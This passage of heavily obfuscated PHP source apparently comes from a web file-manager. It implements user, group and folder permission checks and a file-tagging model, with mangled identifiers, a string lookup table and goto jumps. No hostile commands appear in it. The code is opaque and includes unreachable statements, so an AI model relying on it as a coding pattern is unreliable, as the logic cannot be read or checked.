($Ã¼ÙŒÀ) { $£ÕæÍ×Ú = $Ã¼ÙŒÀ; } } return $£ÕæÍ×Ú; } private function userIsRoot($½¥Úó‘å = false) { $ĞŸ¼ä²® =& $_SERVER[ÕŸ²ó÷å]; if (!$½¥Úó‘å && KodUser::isRoot()) { return !0; } $Ë¾ßÅˆ¾ = Model($ĞŸ¼ä²®[607])->getInfo($½¥Úó‘å); $ÅÒù©¥§ = Model($ĞŸ¼ä²®[2177])->listData($Ë¾ßÅˆ¾[$ĞŸ¼ä²®[2178]]); if ($ÅÒù©¥§ && $ÅÒù©¥§[$ĞŸ¼ä²®[584]][$ĞŸ¼ä²®[2179]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ÁİğÙ) { $òèíËèĞ =& $_SERVER[ÕŸ²ó÷å]; $Öİ˜›ó = Model($òèíËèĞ[1421]); $ÆÑ¯ùéì = $Öİ˜›ó->sourceInfo($ÁİğÙ); if (!$ÆÑ¯ùéì) { return !1; } $Öİ˜›ó->groupPathDisplay($ÆÑ¯ùéì); $˜»¨Ç£Ğ = array($ÆÑ¯ùéì); $˜»¨Ç£Ğ = $Öİ˜›ó->_listAppendPath($˜»¨Ç£Ğ); $ÆÑ¯ùéì = $˜»¨Ç£Ğ[0]; $“–§¤ = $ÆÑ¯ùéì[$òèíËèĞ[591]]; if (isset($ÆÑ¯ùéì[$òèíËèĞ[599]])) { $›â€Œôè = explode($òèíËèĞ[8], trim($ÆÑ¯ùéì[$òèíËèĞ[591]], $òèíËèĞ[8])); array_shift($›â€Œôè); $“–§¤ = $ÆÑ¯ùéì[$òèíËèĞ[597]] . $òèíËèĞ[2180] . implode($òèíËèĞ[8], $›â€Œôè); } return array($òèíËèĞ[503] => $ÆÑ¯ùéì[$òèíËèĞ[32]], $òèíËèĞ[97] => KodIO::make($ÆÑ¯ùéì[$òèíËèĞ[203]]), $òèíËèĞ[2181] => $“–§¤); } private function groupAuthInfo($ò®ÜÚÌ, $÷˜š¾™•) { $©ˆØÒÔ‡ =& $_SERVER[ÕŸ²ó÷å]; $£–¶°Š› = Model($©ˆØÒÔ‡[594])->getInfo($÷˜š¾™•); return array($©ˆØÒÔ‡[2182] => intval($ò®ÜÚÌ[$©ˆØÒÔ‡[496]]), $©ˆØÒÔ‡[2165] => $ò®ÜÚÌ, $©ˆØÒÔ‡[2183] => LNG($©ˆØÒÔ‡[2184]), $©ˆØÒÔ‡[2174] => array($©ˆØÒÔ‡[503] => $£–¶°Š›[$©ˆØÒÔ‡[32]], $©ˆØÒÔ‡[97] => KodIO::make($£–¶°Š›[$©ˆØÒÔ‡[100]][$©ˆØÒÔ‡[203]]), $©ˆØÒÔ‡[2181] => $£–¶°Š›[$©ˆØÒÔ‡[598]])); } protected function groupRootAuth($ĞªŠ–ÔÖ, $¸éêË¥® = false) { $áé®°äŒ =& $_SERVER[ÕŸ²ó÷å]; $¸éêË¥® = $¸éêË¥® ? $¸éêË¥® : USER_ID; $¼€ÀıåÕ = $¸éêË¥® . $áé®°äŒ[2185] . $ĞªŠ–ÔÖ; static $åöÒâïö = array(); if (isset($åöÒâïö[$¼€ÀıåÕ])) { return $åöÒâïö[$¼€ÀıåÕ]; } $‰¸ôá’ü = Model($áé®°äŒ[594])->getInfo($ĞªŠ–ÔÖ); $Ì—ÅºÖ› = $this->userGroupList($¸éêË¥®); $ˆıÆ†× = isset($Ì—ÅºÖ›[$ĞªŠ–ÔÖ]) ? $Ì—ÅºÖ›[$ĞªŠ–ÔÖ][$áé®°äŒ[496]] : !1; if ($ˆıÆ†× && Model($áé®°äŒ[580])->authCheckAction($ˆıÆ†×[$áé®°äŒ[496]], $áé®°äŒ[1993])) { $åöÒâïö[$¼€ÀıåÕ] = $ˆıÆ†×; return $ˆıÆ†×; } $¸ô¤÷¨ = $this->sourceAuthSelect($‰¸ôá’ü[$áé®°äŒ[100]][$áé®°äŒ[203]]); $ƒ‘Ğ†ÖŸ = $¸ô¤÷¨ ? $this->authMake($¸ô¤÷¨, $¸éêË¥®) : !1; $ı»ŞÎ¤’ = $ƒ‘Ğ†ÖŸ ? $ƒ‘Ğ†ÖŸ[$áé®°äŒ[549]] : !1; $åöÒâïö[$¼€ÀıåÕ] = $ı»ŞÎ¤’ ? $ı»ŞÎ¤’ : $ˆıÆ†×; return $åöÒâïö[$¼€ÀıåÕ]; } public function authOwnerApply($¥³×ñê) { $õÏêŠŒ =& $_SERVER[ÕŸ²ó÷å]; if (empty($¥³×ñê[$õÏêŠŒ[496]]) || isset($¥³×ñê[$õÏêŠŒ[2186]]) && $¥³×ñê[$õÏêŠŒ[2186]]) { return $¥³×ñê; } if (AuthModel::authCheckRoot($¥³×ñê[$õÏêŠŒ[496]][$õÏêŠŒ[497]])) { return $¥³×ñê; } $÷›ô¿—Ò = Model($õÏêŠŒ[1421])->parentLevelArray($¥³×ñê[$õÏêŠŒ[593]]); $÷›ô¿—Ò = array_merge(array($¥³×ñê[$õÏêŠŒ[203]]), array_reverse($÷›ô¿—Ò)); $ğ„Š½›Ü = $this->sourceAuthSelect($÷›ô¿—Ò); $ã¶™¯Í¾ = array(); $Áº¿Ê¸Î = array(); foreach ($ğ„Š½›Ü as $ÆÊë˜¦¥ => $¡¾Û–âí) { $ÓêÜ¢Õ· = $this->authFolderOwnerUser($¡¾Û–âí); $ã¶™¯Í¾[$ÆÊë˜¦¥] = $ÓêÜ¢Õ·; $Áº¿Ê¸Î = array_merge($Áº¿Ê¸Î, $ÓêÜ¢Õ·[$õÏêŠŒ[671]]); if ($ÓêÜ¢Õ·[$õÏêŠŒ[2187]]) { break; } } if (count($Áº¿Ê¸Î) == 0) { $Áº¿Ê¸Î = $this->authFolderOwnerGroup($¥³×ñê[$õÏêŠŒ[578]]); } $Áº¿Ê¸Î = array_unique($Áº¿Ê¸Î); if (AuthModel::authCheckRoot($¥³×ñê[$õÏêŠŒ[496]][$õÏêŠŒ[497]])) { $Áº¿Ê¸Î[] = USER_ID; } $¥³×ñê[$õÏêŠŒ[496]][$õÏêŠŒ[2188]] = Model($õÏêŠŒ[586])->userListInfo($Áº¿Ê¸Î); return $¥³×ñê; } private function authFolderOwnerGroup($ê¬‚Í) { $øˆØ€™Ä =& $_SERVER[ÕŸ²ó÷å]; $ù£ÊûÒ¢ = Model($øˆØ€™Ä[2066])->where(array($øˆØ€™Ä[1972] => $ê¬‚Í))->select(); $íÁÃœ“š = array(); if (!$ù£ÊûÒ¢) { return $íÁÃœ“š; } foreach ($ù£ÊûÒ¢ as $ñ°€áò) { $°ª·‘ñ« = $this->authInfo($ñ°€áò); if (AuthModel::authCheckRoot($°ª·‘ñ«[$øˆØ€™Ä[496]])) { $íÁÃœ“š[] = $ñ°€áò[$øˆØ€™Ä[1773]]; } } return $íÁÃœ“š; } private function authFolderOwnerUser($¾¶ï²ºÂ) { $ış²àŞ =& $_SERVER[ÕŸ²ó÷å]; $î½ç¿ñø = array(); $¦ç“²©· = !1; foreach ($¾¶ï²ºÂ as $¹Á¿Çüü) { $ÎØœğ÷œ = $this->authInfo($¹Á¿Çüü); if ($¹Á¿Çüü[$ış²àŞ[578]] == $ış²àŞ[238]) { $¦ç“²©· = !0; } if ($¹Á¿Çüü[$ış²àŞ[200]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ÎØœğ÷œ[$ış²àŞ[496]])) { $î½ç¿ñø[] = $¹Á¿Çüü[$ış²àŞ[578]]; } } } return array($ış²àŞ[671] => $î½ç¿ñø, $ış²àŞ[2187] => $¦ç“²©·); } public function authMake($«˜ßúá, $öØØîæ¹ = false) { $–‰ñùâ§ =& $_SERVER[ÕŸ²ó÷å]; $¸î‚Ğğæ = $this->authArrayCheck($«˜ßúá, $öØØîæ¹); if ($¸î‚Ğğæ[$–‰ñùâ§[2189]]) { $¸î‚Ğğæ[$–‰ñùâ§[2189]] = $this->sourceAuthInfo($¸î‚Ğğæ[$–‰ñùâ§[2189]]); } return $¸î‚Ğğæ; } public function authArrayCheck($«‰äñœª, $ œ´Ü† = false) { $Ã…À«‡Ë =& $_SERVER[ÕŸ²ó÷å]; if (!$«‰äñœª) { return array($Ã…À«‡Ë[497] => 0, $Ã…À«‡Ë[549] => !1); } $ œ´Ü† = $ œ´Ü† ? $ œ´Ü† : USER_ID; $Õ°Æ„É = 0; $Éüêêıµ = 0; $è¸ã÷âİ = 0; $†’„Üëı = 0; $¥¼úÚ¶  = 0; $ŸÙÆÑ¼ = 0; $Ìæ¨£º‚ = 1000; $…¡öŸşº = 0; $·Â•½À¡ = 0; $ƒ«Êéíı = 0; $ë¨äê„ = 0; $ÏÁı£Ğ = array($Ã…À«‡Ë[203] => 0); foreach ($«‰äñœª as $ÏÁı£Ğ) { $š³ÔËĞÒ = $this->authInfo($ÏÁı£Ğ); if (!$š³ÔËĞÒ) { continue; } $¤ƒ¦ ÂÔ = $ÏÁı£Ğ[$Ã…À«‡Ë[578]]; $š¾È±ØÊ = intval($š³ÔËĞÒ[$Ã…À«‡Ë[496]]); if ($ÏÁı£Ğ[$Ã…À«‡Ë[200]] == SourceModel::TYPE_USER && $¤ƒ¦ ÂÔ == $ œ´Ü†) { $Õ°Æ„É = !0; $è¸ã÷âİ = $š³ÔËĞÒ; $Éüêêıµ = $š¾È±ØÊ; } else { if ($ÏÁı£Ğ[$Ã…À«‡Ë[200]] == SourceModel::TYPE_GROUP && $this->groupContainUser($¤ƒ¦ ÂÔ, $ œ´Ü†)) { $†’„Üëı = !0; $ïÌˆºœ¤ = $this->groupStepToUserGroup($¤ƒ¦ ÂÔ, $ œ´Ü†); if ($ïÌˆºœ¤ < $Ìæ¨£º‚) { $Ìæ¨£º‚ = $ïÌˆºœ¤; $¥¼úÚ¶  = $š¾È±ØÊ; $ŸÙÆÑ¼ = $š³ÔËĞÒ; $…¡öŸşº = $¤ƒ¦ ÂÔ; } if ($ïÌˆºœ¤ == $Ìæ¨£º‚ && $š¾È±ØÊ >= $¥¼úÚ¶ ) { $¥¼úÚ¶  = $š¾È±ØÊ; $ŸÙÆÑ¼ = $š³ÔËĞÒ; $…¡öŸşº = $¤ƒ¦ ÂÔ; } } else { if ($¤ƒ¦ ÂÔ == $Ã…À«‡Ë[238]) { $·Â•½À¡ = !0; $ë¨äê„ = $š³ÔËĞÒ; $ƒ«Êéíı = $š¾È±ØÊ; } } } } if ($Õ°Æ„É) { $¨ åÃÎ = $Éüêêıµ; $š³ÔËĞÒ = $è¸ã÷âİ; $ãÈ‰í‡â = LNG($Ã…À«‡Ë[2190]); } else { if ($†’„Üëı) { $¨ åÃÎ = $¥¼úÚ¶ ; $š³ÔËĞÒ = $ŸÙÆÑ¼; $ÅÕ–£ò = Model($Ã…À«‡Ë[594])->getInfo($…¡öŸşº); $ãÈ‰í‡â = $Ã…À«‡Ë[186] . $ÅÕ–£ò[$Ã…À«‡Ë[598]] . $Ã…À«‡Ë[2191] . LNG($Ã…À«‡Ë[2192]); } else { if ($·Â•½À¡) { $¨ åÃÎ = $ƒ«Êéíı; $š³ÔËĞÒ = $ë¨äê„; $ãÈ‰í‡â = LNG($Ã…À«‡Ë[2162]); } else { $¨ åÃÎ = 0; $š³ÔËĞÒ = !1; $ãÈ‰í‡â = $Ã…À«‡Ë[12]; } } } $­øñ¶ğü = array($Ã…À«‡Ë[2182] => intval($¨ åÃÎ), $Ã…À«‡Ë[2165] => $š³ÔËĞÒ, $Ã…À«‡Ë[2183] => $ãÈ‰í‡â, $Ã…À«‡Ë[2174] => $ÏÁı£Ğ[$Ã…À«‡Ë[203]]); return $­øñ¶ğü; } private function groupContainUser($ˆ¿ó‚ù¡, $“û°Ğ¬Õ = false) { return in_array($ˆ¿ó‚ù¡, $this->userGroupParents($“û°Ğ¬Õ)); } private function groupStepToUserGroup($í¼¦é¡Å, $Õî”ŞŞû = false) { $µ‚²”Ô± =& $_SERVER[ÕŸ²ó÷å]; $÷¤êáÑ = $this->userGroupList($Õî”ŞŞû); $Œã¤¡Üó = 1000; $¬Íïó±÷ = $GLOBALS[$µ‚²”Ô±[6]][$µ‚²”Ô±[102]][$µ‚²”Ô±[2079]] == 1; $–±˜¶¾È = $¬Íïó±÷ ? 3 : 2; foreach ($÷¤êáÑ as $¬ô´ìÎ³) { if ($¬ô´ìÎ³[$µ‚²”Ô±[1972]] == $í¼¦é¡Å) { return 0; } $ÌÇˆâ“ì = explode($µ‚²”Ô±[50], trim($¬ô´ìÎ³[$µ‚²”Ô±[593]], $µ‚²”Ô±[50])); if ($ÌÇˆâ“ì[0] == $µ‚²”Ô±[238] && count($ÌÇˆâ“ì) > $–±˜¶¾È) { $­ÃæœŠÇ = array_reverse(array_slice($ÌÇˆâ“ì, $–±˜¶¾È)); $Şî¬³³ = array_search($í¼¦é¡Å, $­ÃæœŠÇ); if ($Şî¬³³ !== !1 && $Şî¬³³ + 1 <= $Œã¤¡Üó) { $Œã¤¡Üó = $Şî¬³³ + 1; } } } return $Œã¤¡Üó; } private function userGroupList($³­äìßæ = false) { $â­éÁÑÃ =& $_SERVER[ÕŸ²ó÷å]; static $£§çÓğ¼ = array(); if (isset($£§çÓğ¼[$³­äìßæ])) { return $£§çÓğ¼[$³­äìßæ]; } $‡Ã­òúÏ = Model($â­éÁÑÃ[607])->getInfo($³­äìßæ); $£§çÓğ¼[$³­äìßæ] = array_to_keyvalue($‡Ã­òúÏ[$â­éÁÑÃ[2163]], $â­éÁÑÃ[1972]); return $£§çÓğ¼[$³­äìßæ]; } public function userGroupParents($„¬ÔıÛ—) { $í“·œ°½ =& $_SERVER[ÕŸ²ó÷å]; static $«¹—Ñ¨ = array(); $„¬ÔıÛ— = $„¬ÔıÛ— ? $„¬ÔıÛ— : USER_ID; if (isset($«¹—Ñ¨[$„¬ÔıÛ—])) { return $«¹—Ñ¨[$„¬ÔıÛ—]; } $À®Ï…• = $this->userGroupList($„¬ÔıÛ—); $µÈÆ¥¿ = array(); $Ëû²ş¡Î = $GLOBALS[$í“·œ°½[6]][$í“·œ°½[102]][$í“·œ°½[2079]] == 1; $ Õæ÷ã = $Ëû²ş¡Î ? 3 : 2; foreach ($À®Ï…• as $¥‰ÑğíÊ) { $Ã÷×¥Üè = array($¥‰ÑğíÊ[$í“·œ°½[1972]]); $¥Œ•ß¾ = explode($í“·œ°½[50], trim($¥‰ÑğíÊ[$í“·œ°½[593]], $í“·œ°½[50])); if ($¥Œ•ß¾[0] == $í“·œ°½[238] && count($¥Œ•ß¾) > $ Õæ÷ã) { $¤¦–¤ó = array_slice($¥Œ•ß¾, $ Õæ÷ã); $Ã÷×¥Üè = array_merge($Ã÷×¥Üè, array_reverse($¤¦–¤ó)); } $µÈÆ¥¿ = array_merge($µÈÆ¥¿, $Ã÷×¥Üè); } $«¹—Ñ¨[$„¬ÔıÛ—] = array_unique($µÈÆ¥¿); return $«¹—Ñ¨[$„¬ÔıÛ—]; } public function authTargetInfoMake($Îë”ÙÓö) { $İáæò©˜ =& $_SERVER[ÕŸ²ó÷å]; $æÌï–² = array(); $îò´°òĞ = array(); foreach ($Îë”ÙÓö as $ø²ıˆ®Ó) { if ($ø²ıˆ®Ó[$İáæò©˜[200]] == SourceModel::TYPE_USER) { $æÌï–²[] = intval($ø²ıˆ®Ó[$İáæò©˜[578]]); } else { if ($ø²ıˆ®Ó[$İáæò©˜[200]] == SourceModel::TYPE_GROUP) { $îò´°òĞ[] = intval($ø²ıˆ®Ó[$İáæò©˜[578]]); } } } if ($æÌï–²) { $æÌï–² = Model($İáæò©˜[586])->userListInfo($æÌï–²); } if ($îò´°òĞ) { $â„Ğ®î = array($İáæò©˜[2064] => array($İáæò©˜[501], $îò´°òĞ)); $îò´°òĞ = Model($İáæò©˜[594])->field($İáæò©˜[2193])->where($â„Ğ®î)->select(); $îò´°òĞ = array_to_keyvalue($îò´°òĞ, $İáæò©˜[1972]); } return array($İáæò©˜[2194] => $æÌï–², $İáæò©˜[2195] => $îò´°òĞ); } public function authInfo($ÂÕÎç±) { $±Ùê´à° =& $_SERVER[ÕŸ²ó÷å]; if ($ÂÕÎç±[$±Ùê´à°[2080]]) { $ßÓ½ÔÙÌ = Model($±Ùê´à°[580])->listData($ÂÕÎç±[$±Ùê´à°[2080]]); if (!$ßÓ½ÔÙÌ) { return !1; $öÖğ£æÙ = Model($±Ùê´à°[580])->listData(); $ë ©Òà¶ = array_filter_by_field($öÖğ£æÙ, $±Ùê´à°[496], $±Ùê´à°[238]); return $ë ©Òà¶; } $è§Ñ‹À = array_field_key($ßÓ½ÔÙÌ, array($±Ùê´à°[484], $±Ùê´à°[32], $±Ùê´à°[496], $±Ùê´à°[1995], $±Ùê´à°[1996])); $è§Ñ‹À[$±Ùê´à°[2196]] = $ÂÕÎç±; return $è§Ñ‹À; } else { return array($±Ùê´à°[502] => 0, $±Ùê´à°[1978] => $ÂÕÎç±[$±Ùê´à°[2140]], $±Ùê´à°[503] => $±Ùê´à°[12], $±Ùê´à°[1995] => $±Ùê´à°[2197]); } } } goto E¿¿—ßÂ”Ş; e„ŸÉçË­: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($õªÀÅñ) { $«¨£Üşá =& $_SERVER[ÕŸ²ó÷å]; return array($«¨£Üşá[2087] => array($«¨£Üşá[2506] . USER_ID, $«¨£Üşá[2088])); } protected function listData() { $òËë‹‚ê =& $_SERVER[ÕŸ²ó÷å]; $ÒÓªğ£ç = array($òËë‹‚ê[1764] => USER_ID, $òËë‹‚ê[566] => array($òËë‹‚ê[2091], 0)); $«À‘×Öé = $òËë‹‚ê[2507]; $§ë‡¶ÚÏ = $this->field($«À‘×Öé)->where($ÒÓªğ£ç)->order($òËë‹‚ê[2094])->select(); return $§ë‡¶ÚÏ ? $§ë‡¶ÚÏ : array(); } protected function addToTag($ª§êóè, $™§û¦Ö ) { $ùğ˜êêÔ =& $_SERVER[ÕŸ²ó÷å]; if (!Model($ùğ˜êêÔ[2238])->listData($™§û¦Ö )) { return !1; } if (is_numeric($ª§êóè)) { $İ¬Ó¸‰ß = Model($ùğ˜êêÔ[908])->pathInfo($ª§êóè); if (!$İ¬Ó¸‰ß) { return !1; } } else { $İ¬Ó¸‰ß = IO::infoSimple($ª§êóè); if (!$İ¬Ó¸‰ß) { return !1; } $²â½ô·Ç = $İ¬Ó¸‰ß[$ùğ˜êêÔ[32]]; $ä¡¯Èå = $İ¬Ó¸‰ß[$ùğ˜êêÔ[33]]; if (isset($İ¬Ó¸‰ß[$ùğ˜êêÔ[494]])) { $ä¡¯Èå = $İ¬Ó¸‰ß[$ùğ˜êêÔ[494]] == $ùğ˜êêÔ[101] ? $ùğ˜êêÔ[88] : $ùğ˜êêÔ[240]; } } $“Î·•Ä¬ = array($ùğ˜êêÔ[1764] => USER_ID, $ùğ˜êêÔ[566] => $™§û¦Ö , $ùğ˜êêÔ[504] => $ª§êóè, $ùğ˜êêÔ[505] => $ä¡¯Èå ? $ä¡¯Èå : $ùğ˜êêÔ[499], $ùğ˜êêÔ[503] => $²â½ô·Ç ? $²â½ô·Ç : $ùğ˜êêÔ[12], $ùğ˜êêÔ[1976] => 0); if ($this->where($“Î·•Ä¬)->find()) { return !1; } return $this->add($“Î·•Ä¬); } protected function removeFromTag($¸ä‰Ï, $Ë¯„İú) { $ıÆ€œ§ì =& $_SERVER[ÕŸ²ó÷å]; if (!Model($ıÆ€œ§ì[2238])->listData($Ë¯„İú)) { return !1; } if (is_array($¸ä‰Ï)) { $¸ä‰Ï = array($ıÆ€œ§ì[7], $¸ä‰Ï); } $¶úÏìœƒ = array($ıÆ€œ§ì[1764] => USER_ID, $ıÆ€œ§ì[566] => $Ë¯„İú, $ıÆ€œ§ì[504] => $¸ä‰Ï); return $this->where($¶úÏìœƒ)->delete(); } protected function removeByTag($ŞÛáÌí¯) { $üœ§Ò‹ƒ =& $_SERVER[ÕŸ²ó÷å]; if (!$ŞÛáÌí¯) { return !1; } $ñğ·éã = array($üœ§Ò‹ƒ[1764] => USER_ID, $üœ§Ò‹ƒ[566] => $ŞÛáÌí¯); return $this->where($ñğ·éã)->delete(); } protected function removeBySource($¢Â‰ÖÚ) { $ãşù½À =& $_SERVER[ÕŸ²ó÷å]; if (is_array($¢Â‰ÖÚ)) { $¢Â‰ÖÚ = array($ãşù½À[7], $¢Â‰ÖÚ); } $…³ò•¨¼ = array($ãşù½À[1764] => USER_ID, $ãşù½À[566] => array($ãşù½À[1095], 0), $ãşù½À[504] => $¢Â‰ÖÚ); return $this->where($…³ò•¨¼)->delete(); } }